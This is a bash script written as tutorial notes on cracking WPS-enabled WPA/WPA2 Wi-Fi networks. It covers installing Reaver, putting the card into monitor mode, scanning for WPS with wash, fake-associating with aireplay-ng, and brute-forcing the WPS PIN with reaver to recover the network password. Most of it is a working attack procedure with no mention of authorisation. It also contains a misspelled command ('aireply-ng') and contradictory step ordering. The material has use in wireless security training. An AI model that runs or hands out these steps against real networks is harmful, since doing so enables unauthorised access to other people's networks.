#!/bin/bash

# it is worth noting that both WPA and WPA2 are similar
# the only difference is the encryption used to ensure the message integrity
# WPA uses TKIP, whereas WPA2 uses CCMP

#### LET'S TALK ABOUT A FEATURE THAT IF ENABLED AND MISCONFIGURED, CAN BE EXPLOITED TO RECOVER THE KEY
# WITHOUT HAVING TO CRACK THE ACTUAL ENCRYPTION
# THIS FEATURE IS CALLED WPS
# WPS ALLOWS DEVICES TO CONNECT TO THE NETWORK WITHOUT HAVING TO ENTER THE KEY FOR THE NETWORK
# THIS WAS MAINLY DESIGNED FOR PRINTERS, SMART TVS ETC.

# you can actually see WPS button on most wireless-enabled printers
# if this button is pressed and then you press the WPS button on the router, the printer will
# connect to the router without you having to enter the key
# the authentication here, is done using an eight-digit PIN
# think of this as a password made up of only eight numbers and the length is only 8
# this actually gives us a small list of possible passwords.
# once we get this pin, it can be used to recover the actual WPA/WPA2 key

# for the above exploitation to work we need to have WPS enabled and it should be misconfigured i.e.
# it needs to be configured to use a normal PIN authentication and not Push Button Authentication.
# if push button authenticaiton is used, the router will refuse any PINs that we try unless the WPS
# button is pressed on the router

# ##FOR US TO BE ABLE TO CHECK IF WPS IS ENABLED FOR ANY OF OUR WPA/WPA2 NETWORKS, WE NEED TO INSTALL WASH
### BELOW ARE THE STEPS FOR INSTALLING REAVER
:'
    To Get instructions on how to install Penetration tools you could depend on kali.tools
    How to install Reaver
    The program is pre-installed on Kali Linux.

    Installation on Linux (Debian, Mint, Ubuntu)

    First, install PixieWPS. Next:

    sudo apt-get -y install build-essential libpcap-dev aircrack-ng
    git clone https://github.com/t6x/reaver-wps-fork-t6x
    cd reaver-wps-fork-t6x*/
    cd src/
    ./configure
    make
    sudo make install
'

# ENABLE MONITOR MODE ON YOUR MACHINE
ifconfig
ifconfig <wireless interface> down
airmon-ng check kill
iwconfig <wireless interface> mode monitor
ifconfig <wireless interface> up

# CHECK NETWORKS THAT HAS WPS FEATURE ENABLED USING WASH INSTEAD OF AIRODUMP
wash --interface <wireless interface>

# LCK tells us whether the wps is locked or not
# it can get locked at times after a number of failed attempts
# if not locked, we can launch the attack

# ASSOCIATE TO THE NETWORK
aireplay-ng --fakeauth <delay_in_sec> -a <target mac address> -h <mac address of wireless adapter> <name of wireless adapter>
aireply-ng --fakeauth 30 -a 00:10:18:90:20:EE -h 48:50:60:2A:45:25 mon0

# ### BEFORE RUNNING THE ABOVE CODE, YOU NEED TO RUN REAVER, THE PROGRAM THAT WILL BRUTEFORCE THE PIN FOR YOU
# AFTER RUNNING REAVER YOU CAN NOW ASSOCIATE WITH THE TARGET USING THE ABOVE COMMAND
# dont associate with reaver because we will be doing this manually using aircrak-ng
reaver --bssid <target-network> --channel <channel of target network> --interface mon0 -vvv --no-associate

# if the attack is successful, we will be able to get:
# the PIN
# the WPA (key) PSK / password
# the ESSID or AP SSID/ name of router
# you can now connect to the network using the WPA PSK (key) 

